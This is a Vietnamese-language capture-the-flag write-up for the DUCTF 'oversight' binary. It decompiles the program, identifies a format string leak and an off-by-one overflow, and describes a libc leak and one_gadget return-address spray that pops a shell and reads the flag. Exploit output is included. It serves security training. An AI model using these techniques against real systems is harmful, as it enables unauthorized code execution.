# Phân tích file

```python
oversight: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=54a5270099fd4f21b907f0119cf6c9af55b61f74, for GNU/Linux 4.4.0, not stripped
```

```python
		Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

# Reverse file

- Main
    
    ```python
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      setbuf(stdout, 0LL);
      puts("Lets play a game");
      wait();
      return 0;
    }
    ```
    
- Wait
    
    ```python
    __int64 wait()
    {
      unsigned int v0; // eax
      char s[5]; // [rsp+Bh] [rbp-85h] BYREF
      char format[120]; // [rsp+10h] [rbp-80h] BYREF
    
      puts("Press enter to continue");
      getc(stdin);
      printf("Pick a number: ");
      fgets(s, 5, stdin);
      v0 = strtol(s, 0LL, 10);
      snprintf(format, 0x64uLL, "Your magic number is: %%%d$llx\n", v0);
      printf(format);
      return introduce();
    }
    ```
    
    - Yêu cầu ta nhập 1 số rồi sau đó hàm strtol sẽ đưa về cơ số 10 sau đó printf(format) ⇒ format string bug.
- Introduce
    
    ```python
    int introduce()
    {
      puts("Are you ready to echo?");
      get_num_bytes();
      return puts("That was fun!");
    }
    ```
    
- get_num_bytes
    
    ```python
    int get_num_bytes()
    {
      unsigned int v0; // eax
      int result; // eax
      char s[13]; // [rsp+Bh] [rbp-15h] BYREF
    
      printf("How many bytes do you want to read (max 256)? ");
      fgets(s, 5, stdin);
      v0 = strtol(s, 0LL, 10);
      if ( v0 > 0x100 )
        result = puts("Don't break the rules!");
      else
        result = echo(v0);
      return result;
    }
    ```
    
    - Nhập size để read tối đa là 256 bytes.
- echo
    
    ```python
    __int64 __fastcall echo(unsigned int a1)
    {
      char v2[256]; // [rsp+0h] [rbp-100h] BYREF
    
      return echo_inner(v2, a1);
    ```
    
- echo_inner
    
    ```python
    int __fastcall echo_inner(_BYTE *a1, int a2)
    {
      a1[(int)fread(a1, 1uLL, a2, stdin)] = 0;
      puts("You said:");
      return printf("%s", a1);
    }
    ```
    

    

# Exploit

- Ta sẽ dùng bug fmt để leak libc và tính base và tính one_gadget. Sau đó control ret về one_gadget.
    
    ```python
    [*] base: 0x7f7cfd5d7000
    [*] one_gadget: 0x7f7cfd6263d5
    ```
    
- Tiếp đến ta cần control ret sau khi debug thì mình thấy bug ở get_num_bytes() nếu ta nhập size 256 và nhập "a"*256 thì ở leave ta thấy như sau.
    
    ```python
    RBP  0x7fffffffdf00 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
    RSP  0x7fffffffdf40 ◂— 0xff05df9b
    0x555555555351 <get_num_bytes+81>     leave
    ► 0x555555555352 <get_num_bytes+82>    ret    <0x6161616161616161>
    ```
    
- Ta có thể control được ret nhưng ret có thể nhảy các ô stack nên khó xác định vì thể mính để luôn payload là p64(one_gadget)*32 thì thế nào cũng ret về one_gadget cho mình.

```python
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] base: 0x7f7cfd5d7000
[*] one_gadget: 0x7f7cfd6263d5
[*] Switching to interactive mode
You said:
cb|$cat flag.txt
DUCTF{1_sm@LL_0ver5ight=0v3rFLOW}
```
